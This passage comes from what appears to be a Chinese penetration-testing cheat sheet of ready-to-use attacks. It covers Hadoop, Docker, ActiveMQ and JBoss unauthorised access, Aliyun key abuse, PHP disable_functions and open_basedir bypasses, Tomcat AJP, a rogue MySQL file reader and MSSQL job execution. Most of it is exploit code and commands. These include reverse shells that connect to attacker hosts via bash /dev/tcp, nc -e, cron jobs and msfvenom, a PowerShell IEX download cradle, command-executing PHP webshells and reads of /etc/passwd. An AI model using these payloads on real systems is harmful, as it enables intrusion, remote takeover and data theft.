</code></pre><h5 id="Hadoop未授权访问"><a href="#Hadoop未授权访问" class="headerlink" title="Hadoop未授权访问"></a>Hadoop未授权访问</h5><pre><code>http://192.168.1.1:8088/cluster
本地监听端口 &gt;&gt; 创建Application &gt;&gt; 调用Submit Application API提交
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://192.168.18.129:8088/&#x27;</span></span><br><span class="line">lhost = <span class="string">&#x27;192.168.18.138&#x27;</span> <span class="comment"># put your local host ip here, and listen at port 9999</span></span><br><span class="line"></span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps/new-application&#x27;</span></span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[<span class="string">&#x27;application-id&#x27;</span>]</span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;application-id&#x27;</span>: app_id,</span><br><span class="line">    <span class="string">&#x27;application-name&#x27;</span>: <span class="string">&#x27;get-shell&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;am-container-spec&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;commands&#x27;</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;command&#x27;</span>: <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#x27;</span> % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;application-type&#x27;</span>: <span class="string">&#x27;YARN&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure>
<h5 id="Docker未授权访问"><a href="#Docker未授权访问" class="headerlink" title="Docker未授权访问"></a>Docker未授权访问</h5><pre><code>默认端口2375
&gt;docker -H tcp://1.1.1.1:2375 images
本地监听
启动容器
docker -H tcp://1.1.1.1:2375 run -id -v /etc/crontabs:/tmp alpine:latest
docker -H tcp://1.1.1.1:2375 ps
进入容器
docker -H tcp://1.1.1.1:2375 exec -it a8ff7ed880fb sh
echo &#39;* * * * * /usr/bin/nc &#123;vps_ip&#125; 9999 -e /bin/sh&#39; &gt;&gt; /tmp/root #添加计划任务
cat /tmp/root 
exit
Shipyard默认密码
admin/shipyard
</code></pre><h5 id="ActiveMQ未授权访问"><a href="#ActiveMQ未授权访问" class="headerlink" title="ActiveMQ未授权访问"></a>ActiveMQ未授权访问</h5><pre><code>默认端口8161
http://1.1.1.1:8161/admin/connections.jsp
PUT /fileserver/%2F%2F2%083.jsp HTTP/1.0
Content-Length: 27
Host: 1.1.1.1:8161
Connection: Close
Authorization: Basic YWRtaW46YWRtaW4=
123123123123123123123123123
</code></pre><h5 id="JBOSS未授权访问"><a href="#JBOSS未授权访问" class="headerlink" title="JBOSS未授权访问"></a>JBOSS未授权访问</h5><pre><code>http://192.168.1.1:8080/jmx-console/ 无需认证进入
jboss.deployment部署shell
addURL()的paramValue写入远程war木马地址
</code></pre><h4 id="阿里云OSS-Key利用"><a href="#阿里云OSS-Key利用" class="headerlink" title="阿里云OSS Key利用"></a>阿里云OSS Key利用</h4><pre><code>反编译app文件，查找可能会包含oss key的文件，如JS。
OSSAccessKey、AccessKeySecret使用OSS浏览器访问。
第三方行云管家可修改系统密码。
反弹shell
From: https://xz.aliyun.com/t/8310
https://api.aliyun.com/#/?product=Ecs
搜索框搜索选择CreateCommand来创建一个命令
CommandContent填命令的base64，Type填RunShellScript
命令echo &quot;bash -i &gt;&amp; /dev/tcp/你的IP/端口 0&gt;&amp;1&quot;| base64
bash -i &gt;&amp; /dev/tcp/你的IP/端口 0&gt;&amp;1
YmFzaCAtaSAmZ3Q7JiAvZGV2L3RjcC8xLjEuMS4xLzQ0NDQgMCZndDsmMQ==
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/841.png~webp" alt="image"></p>
<pre><code>填好以后点调试SDK
会直接给你起一个Cloud shell
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/842.png~webp" alt="image"></p>
<pre><code>并创建一个CreateCommand.py文件，使用vi编辑
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/843.png~webp" alt="image"></p>
<pre><code>填accessKeyId,accessSecret保存执行，并记录Commandid
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/844.png~webp" alt="image"></p>
<pre><code>再次在搜索框搜索InvokeCommand
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/845.png~webp" alt="image"></p>
<pre><code>Commandid填上面请求的返回值，InstanceId填行云管家显示的实例ID
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/846.png~webp" alt="image"></p>
<pre><code>填好了点调试sdk然后编辑文件把accessKeyId accessSecret填一下，执行
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/847.png~webp" alt="image"></p>
<pre><code>然后看监听的服务器shell已经反弹成功
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/848.png~webp" alt="image"></p>
<h4 id="Linux绕过disable-function"><a href="#Linux绕过disable-function" class="headerlink" title="Linux绕过disable_function"></a>Linux绕过disable_function</h4><h5 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h5><pre><code>linux环境
putenv()、mail()可用
https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD
http://192.168.0.107/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so
outpath是命令输出位置，sopath指定so文件路径。
或
替换php文件中的mail为error_log(&quot;a&quot;,1);
</code></pre><h5 id="php7-0-7-3-bypass"><a href="#php7-0-7-3-bypass" class="headerlink" title="php7.0-7.3 bypass"></a>php7.0-7.3 bypass</h5><pre><code>直接bypass
https://raw.githubusercontent.com/mm0r1/exploits/master/php7-gc-bypass/exploit.php
</code></pre><h5 id="windows系统组件com绕过"><a href="#windows系统组件com绕过" class="headerlink" title="windows系统组件com绕过"></a>windows系统组件com绕过</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$command</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$wsh</span> = <span class="keyword">new</span> <span class="title class_">COM</span>(<span class="string">&#x27;WScript.shell&#x27;</span>); <span class="comment">// 生成一个COM对象　Shell.Application也能</span></span><br><span class="line"><span class="variable">$exec</span> = <span class="variable">$wsh</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="string">&quot;cmd /c&quot;</span>.<span class="variable">$command</span>); <span class="comment">//调用对象方法来执行命令</span></span><br><span class="line"><span class="variable">$stdout</span> = <span class="variable">$exec</span>-&gt;<span class="title function_ invoke__">StdOut</span>();</span><br><span class="line"><span class="variable">$stroutput</span> = <span class="variable">$stdout</span>-&gt;<span class="title function_ invoke__">ReadAll</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$stroutput</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="CGI启动方式"><a href="#CGI启动方式" class="headerlink" title="CGI启动方式"></a>CGI启动方式</h5><pre><code>phpinfo中搜索server api是cgi或者fastcgi
如果是cgi模式:上传如下htaccess
Options ExecCGI
AddHandler cgi-script .xx
windows平台
#!C:/Windows/System32/cmd.exe /c start calc.exe
1
linux平台
#!/bin/bash
echo -ne &quot;Content-Type: text:html\n\n&quot;
whoami
如果是fast_cgi，上传如下htaccess
Options +ExecCGI
AddHandler fcgid-script .abc
FcgidWrapper &quot;C:/Windows/System32/cmd.exe /c start cmd.exe&quot; .abc
上传任意文件.abc
相对路径
AddHandler fcgid-script .html
FcgidWrapper &quot;../../php/php7.3.4nts/php-cgi.exe&quot; .html

AddHandler fcgid-script .xx
FcgidWrapper &quot;../../../WWW/localhost/calc.exe&quot; .xx
</code></pre><h5 id="ImageMagick组件绕过"><a href="#ImageMagick组件绕过" class="headerlink" title="ImageMagick组件绕过"></a>ImageMagick组件绕过</h5><pre><code>imageMagick 版本 v6.9.3-9 或 v7.0.1-0
第一种
</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Disable Functions: &quot;</span> . <span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;disable_functions&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$command</span> = PHP_SAPI == <span class="string">&#x27;cli&#x27;</span> ? <span class="variable">$argv</span>[<span class="number">1</span>] : <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$command</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line"><span class="variable">$command</span> = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$exploit</span> = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">push graphic-context</span></span><br><span class="line"><span class="string">viewbox 0 0 640 480</span></span><br><span class="line"><span class="string">fill &#x27;url(https://example.com/image.jpg&quot;|<span class="subst">$command</span>&quot;)&#x27;    //核心</span></span><br><span class="line"><span class="string">pop graphic-context</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;KKKK.mvg&quot;</span>, <span class="variable">$exploit</span>);</span><br><span class="line"><span class="variable">$thumb</span> = <span class="keyword">new</span> <span class="title class_">Imagick</span>();</span><br><span class="line"><span class="variable">$thumb</span>-&gt;<span class="title function_ invoke__">readImage</span>(<span class="string">&#x27;KKKK.mvg&#x27;</span>);</span><br><span class="line"><span class="variable">$thumb</span>-&gt;<span class="title function_ invoke__">writeImage</span>(<span class="string">&#x27;KKKK.png&#x27;</span>);</span><br><span class="line"><span class="variable">$thumb</span>-&gt;<span class="title function_ invoke__">clear</span>();</span><br><span class="line"><span class="variable">$thumb</span>-&gt;<span class="title function_ invoke__">destroy</span>();</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="string">&quot;KKKK.mvg&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="string">&quot;KKKK.png&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<pre><code>第二种
</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* cmd = <span class="string">&quot;nc -e /usr/bin/zsh 127.0.0.1 4444&quot;</span>;</span><br><span class="line">system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fileno</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>编译
gcc -shared -fPIC imag.c -o imag.so
</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;LD_PRELOAD=/var/www/html/imag.so&#x27;</span>);</span><br><span class="line"><span class="variable">$img</span> = <span class="keyword">new</span> <span class="title class_">Imagick</span>(<span class="string">&#x27;/tmp/1.ps&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="常规函数绕过"><a href="#常规函数绕过" class="headerlink" title="常规函数绕过"></a>常规函数绕过</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;whoami&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line">------------------------------------------------------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;whoami&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line">------------------------------------------------------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line">------------------------------------------------------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="string">&quot;whoami&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line">------------------------------------------------------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$command</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$handle</span> = <span class="title function_ invoke__">popen</span>(<span class="variable">$command</span> , <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$handle</span>))</span><br><span class="line">&#123;        <span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$handle</span>, <span class="number">1024</span>);  <span class="comment">//fread($handle, 1024);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">pclose</span>(<span class="variable">$handle</span>);<span class="meta">?&gt;</span></span><br><span class="line">-------------------------------------------------------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$command</span>=<span class="string">&quot;ipconfig&quot;</span>;</span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>));</span><br><span class="line"><span class="variable">$handle</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$command</span> ,<span class="variable">$descriptorspec</span> , <span class="variable">$pipes</span>);</span><br><span class="line"><span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]))</span><br><span class="line">&#123;        <span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">1024</span>); <span class="comment">//fgets($pipes[1],1024);</span></span><br><span class="line">&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec"></a>pcntl_exec</h5><pre><code>开启了pcntl 扩展，并且php 4&gt;=4.2.0 , php5，linux
</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;pcntl_exec&#x27;</span>)) &#123;</span><br><span class="line"><span class="title function_ invoke__">pcntl_exec</span>(<span class="string">&quot;/bin/bash&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;/tmp/test.sh&quot;</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;pcntl extension is not support!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<pre><code>test.sh
#!/bin/bash
nc -e /bin/bash 1.1.1.1 8888       #反弹shell
</code></pre><h5 id="imap-open函数"><a href="#imap-open函数" class="headerlink" title="imap_open函数"></a>imap_open函数</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imap_open&#x27;</span>)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;no imap_open function!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$server</span> = <span class="string">&quot;x -oProxyCommand=echo\t&quot;</span> . <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>] . <span class="string">&quot;&gt;/tmp/cmd_result&quot;</span>) . <span class="string">&quot;|base64\t-d|sh&#125;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">imap_open</span>(<span class="string">&#x27;&#123;&#x27;</span> . <span class="variable">$server</span> . <span class="string">&#x27;:143/imap&#125;INBOX&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">sleep</span>(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/tmp/cmd_result&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="php7-4-FFI绕过"><a href="#php7-4-FFI绕过" class="headerlink" title="php7.4 FFI绕过"></a>php7.4 FFI绕过</h5><pre><code>php 7.4
ffi.enable=true
</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;nc -e /bin/bash ip 8888&#x27;</span>;</span><br><span class="line"><span class="variable">$ffi</span> = <span class="title class_">FFI</span>::<span class="title function_ invoke__">cdef</span>(</span><br><span class="line">    <span class="string">&quot;int system(char *command);&quot;</span>,</span><br><span class="line">    <span class="string">&quot;libc.so.6&quot;</span>);</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h5><pre><code>存在CVE-2014-6271漏洞
PHP 5.*，linux，putenv()、mail()可用
</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellshock</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$tmp</span> = <span class="title function_ invoke__">tempnam</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;data&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$cmd</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;a@127.0.0.1&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;-bv&quot;</span>);</span><br><span class="line"><span class="variable">$output</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp</span>);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$tmp</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="string">&quot;No output, or not vuln.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shellshock</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="蚁剑插件"><a href="#蚁剑插件" class="headerlink" title="蚁剑插件"></a>蚁剑插件</h5><pre><code>01利用LD_PRELOAD环境变量
02利用ShellShock（CVE-2014-6271）
03利用Apache Mod CGI
04 PHP-FPM利用LD_PRELOAD环境变量（同1）
05攻击PHP-FPM监听端口
06 Json Serializer UAF
07具有特定析构函数UAF的PHP7 GC
</code></pre><h4 id="open-basedir绕过"><a href="#open-basedir绕过" class="headerlink" title="open_basedir绕过"></a>open_basedir绕过</h4><pre><code>第一种
http://x.com/shell.php?a=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125;;
http://x.com/shell.php?a=if%20(%20$b%20=%20opendir(%22glob:///var/www/html/*.php%22)%20)%20&#123;while%20(%20($file%20=%20readdir($b))%20!==%20false%20)%20&#123;echo%20%22filename:%22.$file.%22\n%22;&#125;closedir($b);&#125;
第二种
http://x.com/shell.php?a=ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);system(&#39;cat ../../../../../etc/passwd&#39;);
http://x.com/shell.php?a=mkdir(%22/tmp/crispr%22);chdir(%27/tmp/crispr/%27);ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);print_r(scandir(%27.%27))
第三种
命令执行绕过
读文件
?a=show_source(&#39;preload.php&#39;);
?a=echo(readfile(&#39;preload.php&#39;));
?a=print_r(readfile(&#39;preload.php&#39;));
?a=echo(file_get_contents(&#39;preload.php&#39;));
?a=print_r(file_get_contents(&#39;preload.php&#39;));
</code></pre><h4 id="Tomcat-Ajp-LFI-amp-RCE"><a href="#Tomcat-Ajp-LFI-amp-RCE" class="headerlink" title="Tomcat Ajp LFI&amp;RCE"></a>Tomcat Ajp LFI&amp;RCE</h4><pre><code>LFI
https://github.com/Kit4y/CNVD-2020-10487-Tomcat-Ajp-lfi-Scanner
&gt;python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.0.110 -p 8009 -f pass
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/41.png~webp" alt="image"></p>
<pre><code>RCE
&gt;msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.107 LPORT=12138 R &gt;/var/www/html/1.jpg
配合目标文件上传传入服务器
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/42.png~webp" alt="image"></p>
<pre><code>&gt;java -jar ajpfuzzer_v0.6.jar
&gt;connect 192.168.0.110 8009
&gt;forwardrequest 2 &quot;HTTP/1.1&quot; &quot;/index.jsp&quot; 192.168.0.107 192.168.0.107 porto 8009 false &quot;Cookie:AAAA=BBBB&quot;,&quot;Accept-Encoding:identity&quot; &quot;javax.servlet.include.request_uri:index.jsp&quot;,&quot;javax.servlet.include.path_info:/1.jpg&quot;,&quot;javax.servlet.include.servlet_path:/&quot;
</code></pre><p><img src="https://qiniucdn.rhinelab.top/img/20220214/43.png~webp" alt="image"></p>
<h4 id="Mysql连接文件读取"><a href="#Mysql连接文件读取" class="headerlink" title="Mysql连接文件读取"></a>Mysql连接文件读取</h4><pre><code>https://github.com/Gifts/Rogue-MySql-Server
客户端必须启用LOCAL-INFILE 
客户端支持非SSL连接
目标web存在adminer等可检查数据库连接的脚本。
攻击机本地运行python构造假mysql服务，使用目标web连接，读取文件。
#coding=utf-8 
import socket
import logging
logging.basicConfig(level=logging.DEBUG)
filename=&quot;/etc/passwd&quot;
sv=socket.socket()
sv.bind((&quot;&quot;,3305))
sv.listen(5)
conn,address=sv.accept()
logging.info(&#39;Conn from: %r&#39;, address)
conn.sendall(&quot;\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;)
conn.recv(9999)
logging.info(&quot;auth okay&quot;)
conn.sendall(&quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;)
conn.recv(9999)
logging.info(&quot;want file...&quot;)
wantfile=chr(len(filename)+1)+&quot;\x00\x00\x01\xFB&quot;+filename
conn.sendall(wantfile)
content=conn.recv(9999)
logging.info(content)
conn.close()
</code></pre><h4 id="Mysql开启外连"><a href="#Mysql开启外连" class="headerlink" title="Mysql开启外连"></a>Mysql开启外连</h4><pre><code>&gt;grant all privileges on user.* to user@&quot;%&quot; identified by &quot;P@ssw0rd&quot;;
</code></pre><h4 id="MSSQL-amp-Agent-Job上线"><a href="#MSSQL-amp-Agent-Job上线" class="headerlink" title="MSSQL&amp;Agent Job上线"></a>MSSQL&amp;Agent Job上线</h4><pre><code>USE msdb; EXEC dbo.sp_add_job @job_name = N&#39;syspolicy_purge_now&#39; ; EXEC sp_add_jobstep @job_name = N&#39;syspolicy_purge_now&#39;, @step_name = N&#39;syspolicy_purge_step1&#39;, @subsystem = N&#39;PowerShell&#39;, @command = N&#39;powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://IP_OR_HOSTNAME/file&#39;&#39;))&quot;&#39;, @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N&#39;syspolicy_purge_now &#39;; EXEC dbo.sp_start_job N&#39;syspolicy_purge_now &#39;;
使用在注入点处，使用burp进行url编码，编码后前面加%20(空格URL编码)
</code></pre><h4 id="注入无列名"><a href="#注入无列名" class="headerlink" title="注入无列名"></a>注入无列名</h4><pre><code>http://url/index.php?id=1 order by 6
http://url/index.php?id=-1 union select 1,(select `4` from (select 1,2,3,4,5,6 union select * from users)a limit 1,1)-- -
